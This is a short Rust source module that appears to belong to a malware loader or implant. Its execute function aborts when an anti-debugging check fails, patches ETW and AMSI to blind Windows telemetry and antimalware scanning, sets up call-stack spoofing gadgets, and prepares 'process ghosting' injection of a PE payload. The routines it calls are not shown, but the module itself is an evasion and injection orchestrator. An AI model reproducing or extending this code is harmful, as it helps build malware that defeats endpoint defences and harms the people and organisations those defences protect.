pub mod ghosting;

use core::ffi::c_void;

use crate::debug;
use crate::core::nt;
use crate::core::types::*;
use crate::core::{amsi, etw, spoof};


pub unsafe fn execute(config: ghosting::Config) -> bool {
    debug!("[INJECTION] Environment hardening");
    
    if !crate::core::anti_debug::is_safe_environment() { return false; }

    etw::patch_etw();
    amsi::patch_amsi();

    if config.enable_stack_spoof {
        spoof::initialize_spoof_gadgets();
    }

    if !config.enable_ghosting || config.pe_payload.is_empty() { return false; } 

    true    
}